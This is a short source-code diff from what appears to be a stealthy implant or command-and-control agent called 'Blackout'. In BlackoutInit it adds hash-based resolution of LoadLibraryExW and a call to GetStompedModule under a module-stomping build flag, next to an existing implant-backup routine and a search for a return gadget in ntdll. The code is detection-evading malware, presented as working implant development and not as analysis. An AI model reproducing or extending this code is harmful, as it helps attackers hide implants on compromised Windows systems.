@@ -82,6 +82,7 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.TerminateThread           = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "TerminateThread" )  );
     Instance()->Win32.SetFileInformationByHandle= LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "SetFileInformationByHandle" )  );
     Instance()->Win32.LoadLibraryExA            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExA" )  );
+    Instance()->Win32.LoadLibraryExW            = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryExW" )  );
 
     Instance()->Win32.RtlCompareMemory          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCompareMemory" )  );
     Instance()->Win32.RtlZeroMemory             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlZeroMemory" )  );
@@ -178,6 +179,7 @@ FUNC VOID BlackoutInit(
 
 #ifdef BK_STOMP
     CreateImplantBackup();
+    GetStompedModule();
 #endif
 
     Blackout().Gadgets.RetGadget        = FindNtTestAlertGadget( Instance()->Modules.Ntdll );
